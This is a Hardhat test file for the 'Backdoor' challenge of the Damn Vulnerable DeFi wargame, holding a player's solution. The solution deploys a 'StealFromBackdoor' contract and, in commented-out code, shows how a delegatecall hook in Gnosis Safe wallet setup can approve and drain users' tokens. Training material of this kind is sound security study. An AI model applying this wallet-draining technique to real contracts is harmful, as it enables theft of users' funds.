const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
    let deployer, users, player;
    let masterCopy, walletFactory, token, walletRegistry;

    const AMOUNT_TOKENS_DISTRIBUTED = 40n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, player] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy the registry
        walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            masterCopy.address,
            walletFactory.address,
            token.address,
            users
        );
        expect(await walletRegistry.owner()).to.eq(deployer.address);

        for (let i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            expect(
                await walletRegistry.beneficiaries(users[i])
            ).to.be.true;

            // User cannot add beneficiaries
            await expect(
                walletRegistry.connect(
                    await ethers.getSigner(users[i])
                ).addBeneficiary(users[i])
            ).to.be.revertedWithCustomError(walletRegistry, 'Unauthorized');
        }

        // Transfer tokens to be distributed to the registry
        await token.transfer(walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        console.log("Execution/start");

        // exploit the hook in GnosisSafe.sol -> function setup -> setupModules
        // since it used delegatecall, we can approve on behalf of the wallet in advance
        // and retrieve the token afterwards
        steal = await (await ethers.getContractFactory('StealFromBackdoor', player)).deploy(
            token.address,
            users,
            masterCopy.address,
            walletFactory.address,
            walletRegistry.address
        );

        //
        // Below code should also work, but require multiple transaction from player
        //

        // let ABI = [
        //     "function setup(address _token, address _to)"
        // ];
        // let iface = new ethers.utils.Interface(ABI);
        // data = iface.encodeFunctionData("setup", [token.address, player.address]);

        // for (let i = 0; i < users.length; i++) {
        //     console.log("Execution/loop: ", i, users[i]);
        //     userAddress = users[i];

        //     const initCode = masterCopy.interface.encodeFunctionData("setup", [
        //         [userAddress],
        //         1,
        //         steal.address,
        //         data,
        //         ethers.constants.AddressZero,
        //         ethers.constants.AddressZero,
        //         0,
        //         ethers.constants.AddressZero
        //     ]);
        //     await walletFactory.createProxyWithCallback(masterCopy.address, initCode, 1, walletRegistry.address);
        //     await token.connect(player).transferFrom(walletRegistry.wallets(userAddress), player.address, 10n * 10n ** 18n);
        // }
        console.log("Execution/end");
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player must have used a single transaction
        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);

        for (let i = 0; i < users.length; i++) {
            let wallet = await walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            expect(wallet).to.not.eq(
                ethers.constants.AddressZero,
                'User did not register a wallet'
            );

            // User is no longer registered as a beneficiary
            expect(
                await walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
